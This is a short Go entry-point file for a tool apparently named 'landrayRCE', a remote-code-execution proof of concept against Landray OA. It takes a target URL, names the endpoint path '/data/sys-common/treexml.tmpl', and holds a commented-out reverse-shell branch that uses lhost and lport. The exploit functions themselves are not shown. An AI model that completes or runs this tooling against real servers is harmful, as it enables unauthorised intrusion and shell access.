package main

//author:160team.west9B
import (
	"flag"
	"fmt"
)

var (
	method    string
	url       string
	lhost     string
	lport     string
	dnsLogAdr string
	OApath    = "/data/sys-common/treexml.tmpl"
)

func init() {
	flag.StringVar(&url,
		"u",
		"null",
		"url:http://127.0.0.1/",
	)

}
func main() {
	flag.Parse()
	fmt.Println("author:160team.west9b")
	if url != "null" {
		LandrayOA()
		return
	}
	//if method == "exp" && lhost != "ip" && lport != "port" {
	//	ExpBashShell()
	//	return
	//}
	fmt.Println("usage_poc:landrayRCE.exe -u http://landray.com/")
}
